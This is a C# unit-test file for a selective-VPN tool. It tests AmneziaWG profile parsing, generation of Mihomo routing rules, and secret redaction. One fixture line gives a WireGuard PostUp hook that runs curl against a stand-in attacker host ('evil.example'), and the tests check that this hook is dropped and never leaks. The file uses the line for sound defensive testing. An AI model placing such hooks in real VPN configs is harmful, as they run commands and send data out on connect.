using SelectiveVpn.Engine;
using SelectiveVpn.Models;

namespace SelectiveVpn.Tests;

public class AmneziaWgProfileTests
{
    private const string PrivateKey = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
    private const string PublicKey = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=";
    private const string HeaderKey = "MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=";
    private const string PostUpValue = "SUPERPOSTVALUE-SHOULD-NOT-LEAK";

    [Fact]
    public void Reads_v31_profile_and_keeps_secrets_out_of_summary()
    {
        var result = AmneziaWgConfigReader.Read(V31Config());

        Assert.True(result.Succeeded);
        Assert.NotNull(result.Profile);
        Assert.True(result.Profile.IsVersion31);
        Assert.Equal("vpn.example.com", result.Profile.EndpointHost);
        Assert.Equal(51820, result.Profile.EndpointPort);
        Assert.Equal("10.9.9.2", result.Profile.AddressV4);
        Assert.Equal("fd00:9::2", result.Profile.AddressV6);
        Assert.Contains("PostUp", result.Profile.IgnoredParameters);

        var summary = result.Profile.Describe();
        Assert.Contains("AmneziaWG 3.1", summary);
        Assert.DoesNotContain(PrivateKey, summary);
        Assert.DoesNotContain(PublicKey, summary);
        Assert.DoesNotContain(HeaderKey, summary);
        Assert.DoesNotContain(PostUpValue, summary);
        Assert.DoesNotContain(PostUpValue, result.Message);
    }

    [Fact]
    public void Writes_process_rules_and_v31_options()
    {
        var profile = AmneziaWgConfigReader.Read(V31Config()).Profile!;
        var yaml = MihomoProfileWriter.Build(
            profile,
            [
                new RouteTarget(@"C:\Apps\Example App\demo.exe", false),
                new RouteTarget(@"C:\Games\Steam", true)
            ],
            17990,
            "controllersecretvalue",
            17991);

        Assert.Contains("version: 3", yaml);
        Assert.Contains("random-trailers: true", yaml);
        Assert.Contains("disable-cookies: false", yaml);
        Assert.Contains("header-protection-key:", yaml);
        Assert.Contains("respect-rules: true", yaml);
        Assert.Contains("stack: mixed", yaml);
        Assert.Contains(@"'PROCESS-PATH,C:\Apps\Example App\demo.exe,VPN'", yaml);
        Assert.Contains(@"PROCESS-PATH-REGEX,(?i)^C:\\Games\\Steam\\.*", yaml);
        Assert.Contains("vpn-ip-check", yaml);
        Assert.Contains("MATCH,DIRECT", yaml);
        var fullTunnel = MihomoProfileWriter.Build(profile, [], 17990, "controllersecretvalue");
        Assert.Contains("MATCH,VPN", fullTunnel);
        Assert.DoesNotContain("MATCH,DIRECT", fullTunnel);

        var exceptListed = MihomoProfileWriter.Build(
            profile,
            [
                new RouteTarget(@"C:\Apps\Example App\demo.exe", false),
                new RouteTarget(@"C:\Games\Steam", true)
            ],
            17990,
            "controllersecretvalue",
            exceptListed: true);
        Assert.Contains(@"'PROCESS-PATH,C:\Apps\Example App\demo.exe,DIRECT'", exceptListed);
        Assert.Contains(@"PROCESS-PATH-REGEX,(?i)^C:\\Games\\Steam\\.*,DIRECT", exceptListed);
        Assert.Contains("MATCH,VPN", exceptListed);
        Assert.DoesNotContain("MATCH,DIRECT", exceptListed);

        var addresses = MihomoProfileWriter.Build(
            profile,
            [
                new RouteTarget("example.com", Kind: RouteKind.Domain),
                new RouteTarget("1.2.3.4/32", Kind: RouteKind.Ip),
                new RouteTarget("2001:db8::1/128", Kind: RouteKind.Ip)
            ],
            17990,
            "controllersecretvalue");
        Assert.Contains("'DOMAIN-SUFFIX,example.com,VPN'", addresses);
        Assert.Contains("'IP-CIDR,1.2.3.4/32,VPN'", addresses);
        Assert.Contains("'IP-CIDR6,2001:db8::1/128,VPN'", addresses);

        var excluded = MihomoProfileWriter.Build(
            profile,
            [new RouteTarget("example.com", Kind: RouteKind.Domain)],
            17990,
            "controllersecretvalue",
            exceptListed: true);
        Assert.Contains("'DOMAIN-SUFFIX,example.com,DIRECT'", excluded);
        Assert.Contains("MATCH,VPN", excluded);
        Assert.Contains(PrivateKey, yaml);
        Assert.DoesNotContain(PostUpValue, yaml);
        Assert.DoesNotContain("curl", yaml);
    }

    [Fact]
    public void Rejects_unknown_parameter_without_echoing_its_value()
    {
        var text = """
            [Interface]
            PrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
            Address = 10.9.9.2/32
            Mystery = THISVALUEISSECRET

            [Peer]
            PublicKey = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=
            Endpoint = vpn.example.com:51820
            """;

        var result = AmneziaWgConfigReader.Read(text);

        Assert.False(result.Succeeded);
        Assert.Contains("Mystery", result.Message);
        Assert.DoesNotContain("THISVALUEISSECRET", result.Message);
    }

    [Fact]
    public void Redacts_secrets_from_engine_output()
    {
        var line = $"handshake failed for {PrivateKey} at vpn.example.com";
        var redacted = SecretRedactor.Redact(line, [PrivateKey]);

        Assert.DoesNotContain(PrivateKey, redacted);
        Assert.Contains("vpn.example.com", redacted);
        Assert.Contains("[скрыто]", redacted);
    }

    private static string V31Config() => $"""
        [Interface]
        PrivateKey = {PrivateKey}
        Address = 10.9.9.2/32, fd00:9::2/128
        DNS = 10.9.9.1
        MTU = 1280
        Jc = 4
        Jmin = 40
        Jmax = 70
        S1 = 16
        S2 = 16
        S3 = 16
        S4 = 16
        H1 = 1
        H2 = 2
        H3 = 3
        H4 = 4
        I1 = <b 0x01020304><r 8>
        HeaderProtectionKey = {HeaderKey}
        ContentPaddingAddition = 0-32
        RekeyAfterTime = 120-180
        RekeyTimeout = 5
        RejectAfterTime = 180
        KeepaliveTimeout = 10
        MaxHandshakeAttempts = 18
        RandomTrailers = on
        DisableCookies = off
        PostUp = curl http://evil.example/{PostUpValue}

        [Peer]
        PublicKey = {PublicKey}
        Endpoint = vpn.example.com:51820
        AllowedIPs = 0.0.0.0/0, ::/0
        PersistentKeepalive = 25
        """;
}

public class AddressListResolverTests
{
    [Fact]
    public void Parses_multiline_domains_and_ips()
    {
        var parsed = AddressListResolver.Parse("""
            example.com
            # comment
            1.2.3.4
            10.0.0.0/8
            https://Sub.Example.com/path
            """);

        Assert.True(parsed.Succeeded, parsed.Message);
        Assert.Equal(["example.com", "1.2.3.4/32", "10.0.0.0/8", "sub.example.com"], parsed.Entries);
        Assert.Equal(["example.com", "sub.example.com"], parsed.Domains);
        Assert.Equal(["1.2.3.4/32", "10.0.0.0/8"], parsed.DirectIps);
    }

    [Fact]
    public void Expands_address_list_into_domain_and_ip_rules()
    {
        var expanded = AddressListResolver.Expand(
        [
            new RouteTarget(
                "Список",
                Kind: RouteKind.AddressList,
                Entries: ["example.com", "10.0.0.0/8"],
                ResolvedIps: ["1.2.3.4/32", "2001:db8::1/128"])
        ]);

        Assert.Contains(expanded, target => target.EffectiveKind == RouteKind.Domain && target.Path == "example.com");
        Assert.Contains(expanded, target => target.EffectiveKind == RouteKind.Ip && target.Path == "10.0.0.0/8");
        Assert.Contains(expanded, target => target.EffectiveKind == RouteKind.Ip && target.Path == "1.2.3.4/32");
        Assert.Contains(expanded, target => target.EffectiveKind == RouteKind.Ip && target.Path == "2001:db8::1/128");
        Assert.DoesNotContain(expanded, target => target.EffectiveKind == RouteKind.AddressList);

        var profile = AmneziaWgConfigReader.Read("""
            [Interface]
            PrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
            Address = 10.9.9.2/32

            [Peer]
            PublicKey = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=
            Endpoint = vpn.example.com:51820
            """).Profile!;

        var yaml = MihomoProfileWriter.Build(profile, expanded, 17990, "controllersecretvalue");
        Assert.Contains("'DOMAIN-SUFFIX,example.com,VPN'", yaml);
        Assert.Contains("'IP-CIDR,10.0.0.0/8,VPN'", yaml);
        Assert.Contains("'IP-CIDR,1.2.3.4/32,VPN'", yaml);
        Assert.Contains("'IP-CIDR6,2001:db8::1/128,VPN'", yaml);

        var excluded = MihomoProfileWriter.Build(profile, expanded, 17990, "controllersecretvalue", exceptListed: true);
        Assert.Contains("'DOMAIN-SUFFIX,example.com,DIRECT'", excluded);
        Assert.Contains("'IP-CIDR,1.2.3.4/32,DIRECT'", excluded);
        Assert.Contains("MATCH,VPN", excluded);
    }

    [Fact]
    public void Rejects_empty_list()
    {
        var parsed = AddressListResolver.Parse("\n# only comment\n");
        Assert.False(parsed.Succeeded);
    }
}

public class RouteAddressTests
{
    [Theory]
    [InlineData("example.com", "example.com", RouteKind.Domain)]
    [InlineData("https://Example.COM/path", "example.com", RouteKind.Domain)]
    [InlineData("*.Example.com", "example.com", RouteKind.Domain)]
    [InlineData("1.2.3.4", "1.2.3.4/32", RouteKind.Ip)]
    [InlineData("10.0.0.0/8", "10.0.0.0/8", RouteKind.Ip)]
    [InlineData("2001:db8::1", "2001:db8::1/128", RouteKind.Ip)]
    public void Accepts_domains_and_ips(string input, string expected, RouteKind kind)
    {
        Assert.True(RouteAddress.TryParse(input, out var normalized, out var actualKind, out var error), error);
        Assert.Equal(expected, normalized);
        Assert.Equal(kind, actualKind);
    }

    [Theory]
    [InlineData("")]
    [InlineData("not a domain")]
    [InlineData("hello")]
    [InlineData("1.2.3.4,5")]
    public void Rejects_unusable_addresses(string input)
    {
        Assert.False(RouteAddress.TryParse(input, out _, out _, out var error));
        Assert.False(string.IsNullOrWhiteSpace(error));
    }
}
